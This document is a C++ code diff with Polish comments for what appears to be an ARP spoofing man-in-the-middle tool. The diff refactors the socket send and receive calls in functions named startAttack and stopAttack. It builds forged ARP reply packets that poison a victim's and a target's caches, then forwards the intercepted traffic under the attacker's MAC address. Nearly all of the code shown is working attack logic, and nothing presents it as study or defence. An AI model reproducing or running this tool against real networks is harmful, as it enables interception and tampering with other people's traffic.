@@ -1,13 +1,18 @@
 #include "App.hpp"
-#include "PlatformFactory.hpp"
+#include "PlatformAbstraction.hpp"
+#include "NetworkHeaders.hpp"
 #include <cstring>
+#include <cstdint>
+#include <algorithm>
+#include <iostream>
+#ifdef _WIN32
+#include <winsock2.h>
+#else
+#include <arpa/inet.h>
+#endif
 #include <cstdio>
 #include <chrono>
 #include <thread>
-
-#ifdef _WIN32
-#include <windows.h>
-#endif
 
 // Inicjalizacja statycznej zmiennej singleton
 std::unique_ptr<App> App::instance = nullptr;
@@ -187,14 +192,14 @@ bool App::startAttack() {
 		if (now >= nextArpTime) {
 			nextArpTime = now + std::chrono::seconds(arpInterval);
 			
-			if (!rawSocket->send(arpSpoofVictim.data(), arpSpoofVictim.size())) {
+			if (!rawSocket->sendPacket(arpSpoofVictim)) {
 				log(1, "Błąd wysyłania pakietu ARP do ofiary");
 			} else {
 				attackInfo.packetsSent++;
 			}
 			
 			if (!config.oneWayMode) {
-				if (!rawSocket->send(arpSpoofTarget.data(), arpSpoofTarget.size())) {
+				if (!rawSocket->sendPacket(arpSpoofTarget)) {
 					log(1, "Błąd wysyłania pakietu ARP do celu");
 				} else {
 					attackInfo.packetsSent++;
@@ -203,12 +208,10 @@ bool App::startAttack() {
 		}
 		
 		// Próba odbioru pakietów
-		std::vector<uint8_t> buffer(65536);
-		size_t receivedSize;
+		auto receivedPacket = rawSocket->receivePacket();
 		
-		if (rawSocket->receive(buffer.data(), buffer.size(), receivedSize)) {
-			buffer.resize(receivedSize);
-			handlePacket(buffer);
+		if (!receivedPacket.empty()) {
+			handlePacket(receivedPacket);
 			attackInfo.packetsReceived++;
 		}
 		
@@ -239,9 +242,9 @@ void App::stopAttack() {
 	
 	// Wyślij prawidłowe pakiety kilka razy
 	for (int i = 0; i < 3; ++i) {
-		rawSocket->send(arpSpoofVictim.data(), arpSpoofVictim.size());
+		rawSocket->sendPacket(arpSpoofVictim);
 		if (!config.oneWayMode) {
-			rawSocket->send(arpSpoofTarget.data(), arpSpoofTarget.size());
+			rawSocket->sendPacket(arpSpoofTarget);
 		}
 	}
 	
@@ -251,32 +254,34 @@ void App::stopAttack() {
 	log(2, "Atak zatrzymany");
 }
 
-std::vector<uint8_t> App::createArpPacket(const IPAddress& victimIp,
-                                         const std::vector<uint8_t>& victimMac,
-                                         const IPAddress& spoofedIp,
-                                         const std::vector<uint8_t>& myMac) {
-	std::vector<uint8_t> packet(42); // Ethernet header (14) + ARP header (28)
-	
-	// Ethernet header
-	EthernetHeader* eth = reinterpret_cast<EthernetHeader*>(packet.data());
-	std::memcpy(eth->dest, victimMac.data(), 6);
-	std::memcpy(eth->src, myMac.data(), 6);
-	eth->type = htons(0x0806); // ARP
-	
-	// ARP header
-	ArpHeader* arp = reinterpret_cast<ArpHeader*>(packet.data() + 14);
-	arp->hardware_type = htons(1); // Ethernet
-	arp->protocol_type = htons(0x0800); // IPv4
-	arp->hardware_size = 6;
-	arp->protocol_size = 4;
-	arp->opcode = htons(2); // ARP Reply
-	
-	std::memcpy(arp->sender_mac, myMac.data(), 6);
-	std::memcpy(arp->sender_ip, spoofedIp.data(), 4);
-	std::memcpy(arp->target_mac, victimMac.data(), 6);
-	std::memcpy(arp->target_ip, victimIp.data(), 4);
-	
-	return packet;
+std::vector<uint8_t> App::createArpPacket(
+    const IPAddress& victimIp,
+    const std::vector<uint8_t>& victimMac,
+    const IPAddress& spoofedIp,
+    const std::vector<uint8_t>& myMac
+) {
+    std::vector<uint8_t> packet(42); // Ethernet header (14) + ARP header (28)
+
+    // Ethernet header
+    EthernetHeader* eth = reinterpret_cast<EthernetHeader*>(packet.data());
+    std::memcpy(eth->dest, victimMac.data(), 6);
+    std::memcpy(eth->src, myMac.data(), 6);
+    eth->type = htons(0x0806); // ARP
+
+    // ARP header
+    ArpHeader* arp = reinterpret_cast<ArpHeader*>(packet.data() + 14);
+    arp->hardware_type = htons(1); // Ethernet
+    arp->protocol_type = htons(0x0800); // IPv4
+    arp->hardware_size = 6;
+    arp->protocol_size = 4;
+    arp->opcode = htons(2); // ARP Reply
+
+    std::memcpy(arp->sender_mac, myMac.data(), 6);
+    std::memcpy(arp->sender_ip, spoofedIp.toBytes().data(), 4);
+    std::memcpy(arp->target_mac, victimMac.data(), 6);
+    std::memcpy(arp->target_ip, victimIp.toBytes().data(), 4);
+
+    return packet;
 }
 
 void App::handlePacket(const std::vector<uint8_t>& data) {
@@ -296,7 +301,7 @@ void App::handlePacket(const std::vector<uint8_t>& data) {
 		return;
 	}
 	
-	IpHeader* ip = reinterpret_cast<IpHeader*>(data.data() + sizeof(EthernetHeader));
+	IpHeader* ip = reinterpret_cast<IpHeader*>(const_cast<uint8_t*>(data.data() + sizeof(EthernetHeader)));
 	IPAddress srcIp(reinterpret_cast<uint8_t*>(&ip->src));
 	IPAddress dstIp(reinterpret_cast<uint8_t*>(&ip->dest));
 	
@@ -316,7 +321,7 @@ void App::handlePacket(const std::vector<uint8_t>& data) {
 		std::memcpy(newEth->src, attackInfo.myMac.data(), 6);
 	}
 	
-	rawSocket->send(newPacket.data(), newPacket.size());
+	rawSocket->sendPacket(newPacket);
 }
 
 void App::log(int level, const std::string& message) {
